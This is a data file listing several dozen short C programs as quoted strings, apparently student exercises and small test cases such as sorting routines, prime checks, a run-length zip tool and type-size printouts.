    "#include <stdio.h>\n#include <time.h>\nint largest_prime_factor(long number) {\n    int largest_factor = 0;\n    for(int i=2; i <= number; i++) {\n        if(number % i == 0) {\n            if(i > largest_factor)\n                largest_factor = i;\n            number /= i;\n        }\n    }\n    return largest_factor;\n}\nint main() {\n    long NUMBER = 600851475143;\n    clock_t begin = clock();\n    int result = largest_prime_factor(NUMBER);\n    clock_t end = clock();\n    double time = (double)(end - begin) / ((clock_t)1000000000);\n    printf(\"%d [in %f seconds]\", result, time);\n}",
    "#include <stdio.h>\nint main()\n{\n  int num[500], tam = 0; float media = 0;\n  while (scanf(\"%d\", &num[tam]) != (-1))\n  {\n    media += num[tam];\n    tam ++;\n  }\n  media /= tam;\n  printf(\"Media = %.1f\\n\", media);\n  return(0);\n}",
    "#include <stdio.h>\nint main(void) {\n    int num;\n    printf(\"Enter a integer:\");\n    scanf(\"%d\", &num);\n    if (num >= 0)\n        printf(\"%d\", num);\n    else\n        printf(\"%d\", -num);\n    return 0;\n}",
    "#include <stdio.h>\nint sum(int a[3][3]) {\n    int result;\n    result = a[1][2] + a[2][1];\n    return result;\n}\nint main(){\n    int a[3][3];\n    a[1][2] = 10;\n    a[2][1] = 5;\n    printf(\"%d\\n\", a[1][2]);\n    printf(\"%d\\n\", a[2][1]);\n    printf(\"%d\\n\", sum(a));\n    scanf(\"%d\\n\", &a[0][0]);\n    printf(\"%d\\n\", a[0][0]);\n    if (a[1][2] > a[2][1])\n        printf(\"%d\\n\", a[1][2]);\n    else\n        printf(\"%d\\n\", a[2][1]);\n    return 0;\n}",
    "#include <stdio.h>\nvoid cubed(double num);\nint main(void){\n    double num;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5c0f\u6570\uff1a\");\n    scanf(\"%lf\",&num);\n    printf(\"%0.2f\\n\",num);\n    cubed(num);\n    return 0;\n}\nvoid cubed(double num){\n    printf(\"\u7acb\u65b9\u503c\u4e3a\uff1a%0.2f\\n\", num * num * num);\n}",
    "#include<stdio.h>\nint main(){\n    int a,b,c;\n    scanf(\"%d %d\",&a,&b);\n    while(1){\n        scanf(\"%d\",&c);\n        if(c<0){\n            printf(\"%d\",c);\n            break;\n        }\n        if(!(c%a)&&!(c%b)){\n            printf(\"%d\\n2\",c);\n            break;\n        }else if(!(c%a)){\n            printf(\"%d\\n0\",c);\n            break;\n        }else if(!(c%b)){\n            printf(\"%d\\n1\",c);\n            break;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nfloat si(float,float,float);\nint main()\n{\n    float p,t,r;\n    printf(\"Enter principal: \");\n    scanf(\"%f\",&p);\n    printf(\"Enter time: \");\n    scanf(\"%f\",&t);\n    printf(\"Enter rate: \");\n    scanf(\"%f\",&r);\n    printf(\"\\nSimple interest is: %.2f.\\n\",si(p,t,r));\n    return 0;\n}\nfloat si(float p,float t,float r)\n{\n    return (p*t*r/100.0);\n}",
    "\nint main() {\n  int a[1000];\n  int j;\n  for(j = 0; j < 1000; j++)\n    a[j] = j;\n  for(j = 0; j < 1000; j++)\n    a[j] = j;\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n    char *a = \"fuck u\";\n    int i;\n    printf(\"%s\\n\", a);\n    printf(\"%lld\\n\", (long long) &a);\n    long long aa;\n    for (i = 0; i < strlen(a); ++i) {\n        aa += a[i] << (8 * i);\n    }\n    printf(\"%lld\\n\", aa);\n    printf(\"%lld\\n\", 128782101083494l);\n    return 0;\n}",
    "#include <stdio.h>\n\nint get_line(char line[], int maxline);\nvoid squeeze(char s1[], char s2[]);\nint main(void)\n{\n    int len;\n    char s1[1000];\n    char s2[1000];\n    printf(\"Input string s1:\\n\");\n    while ((len = get_line(s1, 1000)) == 0)\n        ;\n    printf(\"Input string s2:\\n\");\n    while ((len = get_line(s2, 1000)) == 0)\n        ;\n    squeeze(s1, s2);\n    printf(\"Result is %s\\n\", s1);\n    return 0;\n}\nint get_line(char s[], int lim)\n{\n    int c, i, l;\n    for (i = 0, l = 0; (c = getchar()) != (-1) && c != '\\n'; ++i)\n        if (i < lim - 1)\n            s[l++] = c;\n    s[l] = '\\0';\n    return l;\n}\nvoid squeeze(char s1[], char s2[])\n{\n    int i, j, k;\n    i = 0;\n    while (s2[i] != '\\0') {\n        j = 0;\n        while (s1[j] != '\\0') {\n            if (s1[j] == s2[i]) {\n                k = j;\n                while ((s1[k] = s1[++k]) != '\\0')\n                    ;\n            } else\n                ++j;\n        }\n        ++i;\n    }\n}",
    "#include <stdio.h>\nint count;\nint tx,ty;\nvoid solve(int k,int x,int y) {\n    if (tx>=x-k&&tx<=x+k&&ty>=y-k&&ty<=y+k) {\n        count++;\n    }\n    if (!(k>1)) {\n        return;\n    }\n    solve(k/2,x-k,y+k);\n    solve(k/2,x+k,y+k);\n    solve(k/2,x-k,y-k);\n    solve(k/2,x+k,y-k);\n}\nint main() {\n    int K;\n    while (scanf(\"%d%d%d\",&K,&tx,&ty)!=(-1)) {\n        if (K==0&&tx==0&&ty==0) {\n            break;\n        }\n        count=0;\n        solve(K,1024,1024);\n        printf(\"%3d\\n\",count);\n    }\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\nint main(int argc, char** argv) {\n    chdir(\"nonexistent\");\n    printf(\"errno: %d = %s\\n\", errno, strerror(errno));\n    perror(\"perror\");\n}",
    "#include <stdio.h>\nint main() {\n    double r;\n    double d;\n    scanf(\"%lf %lf\", &r, &d);\n    double result = ((r * r) - (d * d / 4)) * 3.141592654;\n    printf(\"%lf\", result);\n    return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\nint main()\n{\n    printf(\"Size of Short Int: %d\\n\", sizeof(short int));\n    printf(\"Size of Unsigned Short Int: %d\\n\", sizeof(unsigned short int));\n    printf(\"Size of Unsigned Int: %d\\n\", sizeof(unsigned int));\n    printf(\"Size of Int: %d\\n\", sizeof(int));\n    printf(\"Size of Long Int: %d\\n\", sizeof(long int));\n    printf(\"Size of Unsigned Long Int: %d\\n\", sizeof(unsigned long int));\n    printf(\"Size of Long Long Int: %d\\n\", sizeof(long long int));\n    printf(\"Size of Unsigned Long Long Int%d\\n\", sizeof(unsigned long long int));\n    printf(\"Size of Char: %d\\n\", sizeof(signed char));\n    printf(\"Size of Unsigned Char: %d\\n\", sizeof(unsigned char));\n    printf(\"Size of Float: %d\\n\", sizeof(float));\n    printf(\"Size of Double: %d\\n\", sizeof(double));\n    printf(\"Size of Long Double: %d\\n\", sizeof(long double));\n    printf(\"\\n\");\n    printf(\"Range of Short Int: %d to %d\\n\", (-32767 -1), 32767);\n    printf(\"Range of Unsigned Short Int: 0 to %d\\n\", (32767 *2 +1));\n    printf(\"Range of Unsigned Int: 0 to %lu\\n\", (2147483647 *2U +1U));\n    printf(\"Range of Int: %d to %d\\n\", (-2147483647 -1), 2147483647);\n    printf(\"Range of Long Int: %ld to %ld\\n\", (-2147483647L -1L), 2147483647L);\n    printf(\"Range of Unsigned Long Int: 0 to %lu\\n\", (2147483647L *2UL+1UL));\n    printf(\"Range of Long Long Int: %lld to %lld\\n\", (-9223372036854775807LL -1LL), 9223372036854775807LL);\n    printf(\"Range of Unsigned Long Long Int: 0 to %llu\\n\", (9223372036854775807LL*2ULL+1ULL));\n    printf(\"Range of Char: %d to %d\\n\", (-127 -1), 127);\n    printf(\"Range of Unsigned Char: 0 to %d\\n\", (127*2 +1));\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main (int argc, const char * argv[]) {\n char myArray[50];\n int length = 0;\n printf(\"Please enter your full name: \");\n fgets(myArray, 50, (stdin));\n length = strlen(myArray);\n myArray[ length - 1 ] = 0;\n printf(\"Welcome %s.\", myArray);\n return 0;\n}",
    "#include <stdio.h>\nint main () {\n char istr[81],ch;\n int ii;\n ch=getchar();\n for(ii=0;ch!='\\n';ii++){\n  if(ch>='A'&&ch<='Z'){\n   ch = 'Z'-(ch-'A');\n  }\n  istr[ii] = ch;\n  ch = getchar();\n }\n istr[ii+1] = '\\0';\n int oi = 0;\n while(istr[oi]!='\\0'){\n  putchar(istr[oi]);\n  oi++;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\nint i,j,a[100][100],b[100],m,n,srow,max;\nscanf(\"%d%d\",&n,&m);\nfor(i=0;i<n;i++)\n  {srow=0;\n      for(j=0;j<m;j++)\n       {\n         scanf(\"%d\",&a[i][j]);\n         srow+=a[i][j];\n       }\n       b[i]=srow;\n  }\nmax=b[0];\n  for(i=1;i<n;i++)\n   {\n       if(b[i]>max)\n       max=b[i];\n   }\n  for(i=0;i<n;i++)\n    {\n        if(b[i]==max)\n        printf(\"%d \",i);\n    }\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int s = 0;\n    for (int i = 0; i < 100; i++) {\n        s = s + i;\n    }\n    printf(\"S = %d\\n\", s);\n    int i1 = 0, i2 = 1;\n    while (i2 < 1000) {\n          printf(\"%d\\n\", i2);\n          int i1Alt = i1;\n          i1 = i2;\n          i2 = i1Alt + i2;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nlong power(int, int);\nint main() {\n    char line[65];\n    fgets(line, 65, (stdin));\n    size_t length = strlen(line);\n    if (line[length - 1] == '\\n') {\n        line[length - 1] = '\\0';\n    }\n    length = strlen(line);\n    int i;\n    long long sum = 0;\n    for (i = length - 1; i >= 0; i--) {\n        int coeff = line[i] - '0';\n        sum += coeff * power(2, length - i - 1);\n    }\n    printf(\"%lld\\n\", sum);\n    return 0;\n}\nlong power(int x, int y) {\n    int i;\n    long result = 1;\n    for (i = 0; i < y; i++) {\n        result *= x;\n    }\n    return result;\n}",
    "#include <stdio.h>\nint main() {\n int N,pre=0,cnt[10]={0};\n scanf(\"%d\",&N);\n for(int i=1;N;i*=10){\n  int now=N%10;\n  N/=10;\n  for(int j=0;j<now;j++) cnt[j]+=(N+1)*i;\n  cnt[now]+=N*i+pre+1;\n  for(int j=now+1;j<10;j++) cnt[j]+=N*i;\n  cnt[0]-=i;\n  pre+=now*i;\n }\n for(int i=0;i<10;++i) printf(i?\" %d\":\"%d\",cnt[i]);\n}",
    "#include<stdio.h>\nint binarySearch(int arr[], int size, int element){\n    int low, mid, high;\n    low = 0;\n    high = size-1;\n    while(low<=high){\n        mid = (low + high)/2;\n        if(arr[mid] == element){\n            return mid;\n        }\n        if(arr[mid]<element){\n            low = mid+1;\n        }\n        else{\n            high = mid -1;\n        }\n    }\n    return -1;\n}\nint main(){\n    int size;\n    scanf(\"%d\",&size);\n    int arr[size] ;\n    for (int i = 0; i < size; i++)\n    {\n        scanf(\"%d\", &arr[i]);\n    }\n    int target;\n    scanf(\"%d\",&target);\n    int ans = binarySearch(arr, size, target);\n    printf(\"%d\",ans);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,i,x,a,count=0,b=1;\n scanf(\"%d\",&n);\n i=1;\n while(b!=0){\n  count=0;\n  for(x=2;x<n+i;x++){\n   a=(n+i)%x;\n   if(a==0)\n   count++;\n  }\n  i++;\n  b=count;\n }\n printf(\"%d\",n+i-1);\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\n#include<time.h>\nfloat Fx(float x)\n{\n    float z = x*exp(x)-3 ;\n    return z;\n}\ndouble Round(double val,int d_p)\n{\n    double nearest = roundf(val * pow(10,d_p)) / pow(10,d_p);\n    return nearest;\n}\nint Regular_Falsi_Root(double a, double b,int d_p,int i,int count)\n{\n    double init_x,new_x;\n    double fa = Fx(a);\n    double fb = Fx(b);\n    double t = (a*fb - b*fa)/(fb - fa);\n    printf(\"\\nStep %d: x(%d) = %0.5lf ,f(x%d) = %0.5lf , b = %0.5lf , count = %d\",i,i-1,a,i-1,fa,b,count);\n    if(fa <0)\n    {\n        init_x = a;\n        a = t;\n        new_x = t;\n        if(count == 3)\n        {\n            printf(\"\\n\\nLoop terminated, real root found = %.*lf\\n\",d_p,new_x);\n            return 0 ;\n        }\n        if(Round(init_x,d_p) == Round(new_x,d_p))\n            count++;\n        else\n            count =1;\n        i++;\n        Regular_Falsi_Root(a,b,d_p,i,count);\n    }\n    else\n    {\n        printf(\"\\nSomething went wrong. Couldn't converge into a real root !!!\\n\");\n        return 0;\n    }\n}\nint main()\n{\n    double x,b;\n    int d_p;\n    printf(\"\\n------------- Welcome to Regular Falsi Approximation program  --------------\\n\");\n    printf(\"\\n1.Enter the Lower limit (Xo) of the root: \");\n    scanf(\"%lf\",&x);\n    printf(\"\\n2.Enter the Upper limit (b) of the root: \");\n    scanf(\"%lf\",&b);\n    printf(\"\\n3.Enter the no of decimal places to be considered: \");\n    scanf(\"%d\",&d_p);\n    printf(\"\\n----------------------------------------------------------------------------\");\n    clock_t begin = clock();\n    Regular_Falsi_Root(x,b,d_p,1,1);\n    clock_t end = clock();\n    double time_spent = (double)(end - begin) / ((clock_t)1000000000);\n    printf(\"\\n----------------------------------------------------------------------------\");\n    printf(\"\\nExecution time: %lf\",time_spent);\n    printf(\"\\n----------------------------------------------------------------------------\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int ara[] = {3, 1, 5, 2, 4};\n    int i, min, j, index, temp;\n    for (i = 0; i < 5; i += 1) {\n        min = 1000;\n        for (j = i; j < 5; j++) {\n            if (ara[j] < min) {\n                min = ara[j];\n                index = j;\n            }\n        }\n        temp = ara[i];\n        ara[i] = min;\n        ara[index] = temp;\n    }\n    for (i = 0; i < 5; i++) {\n        printf(\"%d\\n\", ara[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void){\n int testcase;\n int smax=0;\n int *people;\n int tmp;\n int num=0, i=0;\n int total=0;\n char a;\n scanf(\"%d\", &testcase);\n for(tmp=1;tmp<=testcase;tmp++){\n  num=0;\n  total=0;\n  scanf(\"%d\", &smax);\n  people=(int*)malloc(sizeof(int)*(smax+1));\n  a=getc((stdin));\n  for(i=0;i<smax+1;i++){\n   a=getc((stdin));\n   *(people+i)=a-48;\n  }\n  for(i=0;i<smax+1;i++){\n   if(total<i){\n    num+=i-total;\n    total+=i-total;\n   }\n   total+=*(people+i);\n  }\n  printf(\"Case #%d: %d\\n\", tmp, num);\n  free(people);\n }\n return 0;\n}",
    "#include<stdio.h>\n\n\nint contar(char s[]){\n  char end = '\\0', esp = ' ';\n  int i, count = 0;\n  int na_palavra = 0;\n  for(i=0; s[i] != end; ++i){\n     if(s[i]!= esp && s[i] != end && na_palavra == 0){\n       na_palavra = 1;\n       count++;\n     }\n     else if(na_palavra == 1 && ( s[i]==esp || s[i] == end) ){\n na_palavra = 0;\n     }\n  }\n  return count;\n}\nint main(){\n  char s[] = \"Ifce Campus Aracati\\0\";\n  int count = contar(s);\n  printf(\"qtde palavras: %d\\n\", count);\n  return 0;\n}",
    "#include <stdio.h>\nint maks(int *p1, int *p2) {\n   int rez;\n   if (*p1 > *p2) {\n      rez = *p1;\n   } else {\n      rez = *p2;\n   }\n   return rez;\n}\nint main(void) {\n   int n, m;\n   printf(\"Upisite dva cijela broja > \");\n   scanf(\"%d %d\", &n, &m);\n   printf(\"Rezultat je %d\", maks(&n, &m));\n   return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int quantidade;\n    scanf(\"%d\", &quantidade);\n    printf(\"Pre\u00e7o: %lf\", quantidade * (quantidade < 12 ? 1.3 : 1.0));\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,sum=0;\n    printf(\"Enter a number : \");\n    scanf(\"%d\",&n);\n    while(n!=0)\n    {\n        sum+=n%10;\n        n/=10;\n    }\n    printf(\"The sum of all the digits is : %d\",sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int n=2;\n int arr_name[n];\n}",
    "#include <stdio.h>\nstatic int count;\nint func(void);\nint main(void){\n int i;\n for(i=0;i<10;i++){\n  printf(\"func has been called %d time(s) \\n\", func());\n }\n return 0;\n}\nint func(void){\n return ++count;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main (int argc, char **argv){\n char name[4096];\n FILE *bob,*joe,*moe;\n int thing, factor, arg;\n if(argc >= 3){\n  char *end_char;\n  factor = strtol(argv[1], &end_char, 0);\n  if(!*(argv[1]) || *end_char)\n  {\n   fputs(\"I can haz number?\\n\", (stderr));\n   return 1;\n  }\n  arg = 2;\n }else{\n  factor = 9;\n  arg = 1;\n }\n if(argc<2){\n  fputs(\"I pity the fool who don't have an input file!\\n\",(stderr));\n  return 1;\n }\n if(strlen(argv[arg]) >= 4096 - 4)\n {\n  fputs(\"It's a filename, not a novel.\\n\", (stderr));\n  return 1;\n }\n strlcpy(name,argv[arg],sizeof(name));\n strlcat(name,\".dpu\",sizeof(name));\n if((bob = fopen(argv[arg],\"r\"))==((void*)0)){\n  fputs(\"NO YOU FOOL, A REAL ONE!\\n\",(stderr));\n  return 1;\n }\n if((joe = fopen(name,\"w\"))==((void*)0)){\n  fputs(\"Ummm, you seem to have an unwritable file or directory or something silly called the output file, this is dumb. Please stop.\\n\",(stderr));\n  return 1;\n }\n if((moe = fopen(\"/dev/urandom\",\"r\"))==((void*)0)){\n  fputs(\"So, you aren't random enough. Annoying.\\n\",(stderr));\n  return 1;\n }\n fprintf(joe,\"DOUBLEPLUS UNZIP, FACTOR=%d;\",factor);\n while((thing=fgetc(bob))!=(-1)){\n  int i;\n  if((fputc(thing,joe))==(-1)){\n   perror(\"fputc(thing,joe)\");\n   fputs(\"problematic\\n\",(stderr));\n   return 1;\n  }\n  for(i=0;i<factor;i++){\n   thing=fgetc(moe);\n   fputc(thing,joe);\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n int i = 4;\n double d = 4.0;\n char s[] = \"HackerRank \";\n int ii;\n double dd;\n char s2[70];\n char s3;\n scanf(\"%d\", &ii);\n scanf(\"%lf\", &dd);\n scanf(\"%c\", &s3);\n fgets(s2, 70, (stdin));\n printf(\"%d\\n\", i + ii);\n printf(\"%.1lf\\n\", d + dd);\n printf(\"%s%s\\n\", s, s2);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int aux = 97,i, k = 0, n;\n int frase_aux[200];\n char letra, frase[200];\n scanf(\"%d\", &n);\n getchar();\n for( ; n > 0 ; --n)\n {\n  scanf(\"%c\", &letra);\n  while(letra != '\\n')\n  {\n   frase[k] = letra;\n   for(i = 0 ; i < k ; ++i)\n   {\n    if(letra == frase[i])\n    {\n     printf(\"%c\", (char)frase_aux[i]);\n     frase_aux[k] = frase_aux[i];\n     break;\n    }\n   }\n   if(i == k)\n   {\n    printf(\"%c\", (char)aux);\n    frase_aux[k] = aux;\n    ++aux;\n   }\n   ++k;\n   scanf(\"%c\", &letra);\n  }\n  printf(\"\\n\");\n  k = 0 ; aux = 97;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    puts(\"Hello, Unix world\");\n}",
    "int fibonacci_recursive(int n)\n{\n    if (n == 0)\n    {\n        return 0;\n     }\n     if (n == 1) {\n           return 1;\n     }\n     return fibonacci_recursive(n - 1) + fibonacci_recursive(n - 2);\n}\nint main(){\n int x = 9;\n return fibonacci_recursive(x);\n}",
    "#include <stdio.h>\nint main(void)\n{\n  float a,b;\n  b=2.0e20+1;\n  a=b-2.0e20;\n  printf(\"%f\",a);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid tukar(int *a, int *b)\n{\n    int sementara = *a;\n    *a=*b;\n    *b = sementara;\n}\nvoid insertionSort(int arr[], int size)\n{\n    for(int i = 1; i < size; i++)\n    {\n        int tukar = arr[i];\n        int j = i -1;\n        while(arr[j]> tukar && j>=0)\n        {\n            arr[j+1] = arr[j];\n            j--;\n        }\n        arr[j+1] = tukar;\n    }\n}\nint main()\n{\n    int data[100],n,i,k,size;\n    printf(\"Mau berapa data yang disimpan?\\n\");\n    scanf(\"%d\", &size);\n    printf(\"Masukkan %d data (integer)\\n\", size);\n    for (i = 0; i < size; i++)\n    {\n        scanf(\"%d\", &data[i]);\n    }\n    insertionSort(data,size);\n    printf(\"\\nASCENDING : \\n\");\n    for(int i=0; i<size; i++)\n    {\n        printf(\"%d, \",data[i]);\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main ()\n{\nint foo[10];\nint sz = sizeof (int);\nchar *bar = (char *)foo;\nbar [sz * 9] = 0;\nreturn 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n int N, i, a, b, s, HCF, j;\n float factorial, series;\n factorial = 1;\n series = 1;\n a = 42;\n b = 98;\n s = a<b?a:b;\n for(i=s;i>=1;i--){\n  if(a%i==0 && b%i==0){\n   HCF = i;\n   break;\n  }\n }\n for(i=1;i<HCF;i++){\n  factorial = factorial * i;\n  series = series + (pow(4, i)/factorial);\n }\n printf(\"%f\", series);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int array[100], search, c, n;\n  printf(\"Enter the number of elements in array\\n\");\n  scanf(\"%d\", &n);\n  printf(\"Enter (%d) integer(s)\\n\", n);\n  for (c = 0; c < n; c++)\n    scanf(\"%d\", &array[c]);\n  printf(\"Enter a number to search\\n\");\n  scanf(\"%d\", &search);\n  for (c = 0; c < n; c++)\n  {\n    if (array[c] == search)\n    {\n      printf(\"%d is present at location %d.\\n\", search, c+1);\n      break;\n    }\n  }\n  if (c == n)\n    printf(\"%d isn't present in the array.\\n\", search);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid swap(int *a, int *b)\n{\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}\nint partition(int arr[], int low, int high)\n{\n    int pivot = arr[low];\n    int i = low - 1, j = high + 1;\n    while (1)\n    {\n        do\n        {\n            i++;\n        } while (arr[i] < pivot);\n        do\n        {\n            j--;\n        } while (arr[j] > pivot);\n        if (i >= j)\n            return j;\n        swap(&arr[i], &arr[j]);\n    }\n}\nvoid partitionSort(int arr[], int low, int high)\n{\n    if (low < high)\n    {\n        int value = partition(arr, low, high);\n        partitionSort(arr, low, value);\n        partitionSort(arr, value + 1, high);\n    }\n}\nvoid printArray(int arr[], int n)\n{\n    int i;\n    for (i = 0; i < n; i++) printf(\"%d \", arr[i]);\n    printf(\"\\n\");\n}\nint main()\n{\n    int arr[20];\n    int i, range = 100;\n    for (i = 0; i < 20; i++)\n    {\n        arr[i] = rand() % range + 1;\n    }\n    int size = sizeof arr / sizeof arr[0];\n    printf(\"Array: \\n\");\n    printArray(arr, size);\n    partitionSort(arr, 0, size - 1);\n    printf(\"Sorted Array: \\n\");\n    printArray(arr, size);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  int a = 5;\n  int b = 2;\n  int result;\n  printf(\"Check: Is a == b?\\n\");\n  result = a == b;\n  printf(\"Result is %d.\\n\", result);\n  if (result) {\n    printf(\"TRUE!\\n\");\n  } else {\n    printf(\"FALSE!\\n\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(){\n    char str[100];\n    scanf(\"%s\",&str);\n    int count=1;\n    for(int i=1;i<strlen(str);i++){\n        if(str[i]==str[i-1]){\n            count=count+1;\n            if(count==7){\n                printf(\"YES\\n\");\n                return 0;\n            }\n        }\n        else{\n            count=1;\n        }\n    }\n    printf(\"NO\\n\");\n    return 0;\n}",
    "#include <ctype.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef int (*get_hash_t)(const char *s);\nint simple_hash(const char *s) {\n  unsigned res;\n  while (*s != '\\0') {\n    res += *(s++);\n  }\n  return res % (15 - 1);\n}\nint ncollisions(char **strs, int n, get_hash_t f) {\n  unsigned narray[15 + 1] = {0}, i, collisions = 0;\n  for (i = 0; i < n; i++) {\n    narray[f(strs[i])] += 1;\n  }\n  for (i = 0; i < 15; i++) {\n    if (narray[i] != 0) {\n      collisions += narray[i] - 1;\n    }\n  }\n  return collisions;\n}\nint main() {\n  char *strings[] = {\"ad\", \"bc\"};\n  printf(\"%d\\n\", ncollisions(&strings[0], 2, simple_hash));\n}",
    "#include<stdio.h>\n#include<math.h>\nint t[100000];\nint main(){\n int i = 0, j = 0;\n double m = 0, v1, v2, v3, v4;\n do{\n  scanf(\"%d\", &t[i + 1]);\n  m = m + t[i + 1];\n  i++;\n }\n while(t[i] != 0);\n i--;\n m = m / i;\n for(j = 2; j <= (i - 1); j++){\n  v1 = pow(t[j], 2.0);\n  v2 = (t[j-1] + t[j] + t[j+1])/3.0;\n  v3 = m * v2;\n  v4 = v1 / v3;\n  printf(\"%.4lf\\n\", v4);\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nFILE *inputFile, *outputFile;\nvoid zip()\n{\n int filelen;\n char cursor,temp;\n temp=fgetc(inputFile);\n filelen=1;\n while(!feof(inputFile))\n {\n  cursor=fgetc(inputFile);\n  if (cursor==temp){\n   filelen++;\n  } else {\n   fputc(filelen+'0',outputFile);\n   fputc(temp,outputFile);\n   temp=cursor;\n   filelen=1;\n  }\n }\n fclose(inputFile);\n fclose(outputFile);\n}\nvoid unzip()\n{\n int filelen;\n char cursor;\n while(!feof(inputFile)){\n  filelen = fgetc(inputFile)-'0';\n  cursor = fgetc(inputFile);\n  while(filelen--)\n   fputc(cursor,outputFile);\n }\n fclose(inputFile);\n fclose(outputFile);\n}\nint main(int argc, char* argv[]){\n    if (argc == 4){\n        inputFile = fopen(argv[1], \"rb\");\n        outputFile = fopen(argv[3], \"wb\");\n     if (!inputFile || !outputFile) {\n      printf(\"No File Detected!\\n\");\n            return 0;\n     } else if (strcmp(argv[2],\"-c\") == 0){\n            zip();\n            printf(\"Zip success!\\n\");\n            return 0;\n        } else if (strcmp(argv[2],\"-d\") == 0){\n            unzip();\n            printf(\"Unzip success!\\n\");\n            return 0;\n        }\n    } else {\n        printf(\"No such options, read help below.\\n\");\n        printf(\"'-c' zip a file with RLE.\\n\");\n        printf(\"'-d' unzip a file ziped with RLE.\\n\");\n        return 1;\n    }\n}",
    "#include<stdio.h>\nint main()\n{\n    int t,i,n,j,tmp,max;\n    scanf(\"%d\",&t);\n    for(i=0;i<t;i++)\n    {\n        scanf(\"%d\",&n);\n        max=0;\n        for(j=0;j<n;j++)\n        {\n            if(j==n-1) scanf(\"%d\",&tmp);\n            else scanf(\"%d \",&tmp);\n            if(tmp>max) max = tmp;\n        }\n        printf(\"Case %d: %d\\n\",i+1,max);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint findMin(int* nums, int numsSize);\nint main()\n{\n    int num[5] = {2,2,2,0,1};\n    int * nums = num;\n    int max;\n    max = findMin(nums, 5);\n    printf(\"%d\\n\", max);\n    return 0;\n}\nint findMin(int* nums, int numsSize) {\n    if (numsSize < 1) return -1;\n    int min = nums[0];\n    for (int i = 1; i < numsSize; i++)\n    {\n     if (nums[i] < nums[i - 1])\n     {\n      min = nums[i];\n      break;\n     }\n    }\n    return min;\n}",
    "#include <stdlib.h>\nint strcmp (const char *, const char *);\nint ap_standalone;\nconst char *ap_check_cmd_context (void *a, int b)\n{\n  return 0;\n}\nconst char *server_type (void *a, void *b, char *arg)\n{\n  const char *err = ap_check_cmd_context (a, 0x01|0x02|0x04|0x08|0x10);\n  if (err)\n    return err;\n  if (!strcmp (arg, \"inetd\"))\n    ap_standalone = 0;\n  else if (!strcmp (arg, \"standalone\"))\n      ap_standalone = 1;\n  else\n    return \"ServerType must be either 'inetd' or 'standalone'\";\n  return 0;\n}\nint main ()\n{\n  server_type (0, 0, \"standalone\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main() {\n    int tam;\n    FILE *arq;\n    arq = fopen(\"arquivo.bin\", \"rb\");\n    if (arq == ((void*)0)) {\n        printf(\"Erro na abertura do arquivo\\n\");\n        system(\"pause\");\n        exit(1);\n    }\n    fseek(arq, 0, (2));\n    tam = ftell(arq);\n    fclose(arq);\n    printf(\"Tamanho do arquivo em bytes: %d\", tam);\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int dividend, divisor, quotient, remainder;\n    printf(\"Enter dividend: \");\n    scanf(\"%d\", &dividend);\n    printf(\"Enter divisor: \");\n    scanf(\"%d\", &divisor);\n    quotient = dividend / divisor;\n    remainder = dividend % divisor;\n    printf(\"Quotient = %d\\n\", quotient);\n    printf(\"Remainder = %d\", remainder);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a = 1, b = 2, c = 3, d = 4;\n    printf(\"%d\\n\", (a > b ) || ( c < d ));\n    printf(\"%d\\n\", d > 2 * 2);\n    printf(\"%d\\n\", !(a < b));\n    printf(\"%d\\n\", (a + c == b));\n    printf(\"%d\\n\", (a == b) && (a >= c));\n    printf(\"%d\\n\", (a != b) || (a != c));\n    printf(\"%d\\n\", !((a >= b) || (a + c)));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint isPrime(int n);\nvoid displayFibonacciPrimes(int n);\nint main(void)\n{\n  int n;\n  scanf(\"%d\", &n);\n  if(n < 1)\n    n = 1;\n  displayFibonacciPrimes(n);\n  return 0;\n}\nint isPrime(int n)\n{\n  int i;\n  for (i = 2; i < n; i++)\n    if(n % i == 0)\n      return 0;\n  return 1;\n}\nvoid displayFibonacciPrimes(int n)\n{\n  int cont = 1, sum = 0, previous = 1, next = 1;\n  while (cont <= n)\n  {\n    sum = previous + next;\n    previous = next;\n    next = sum;\n    if (isPrime(sum))\n    {\n      printf(\"%d \", sum);\n      cont++;\n    }\n    sum = 0;\n  }\n}",
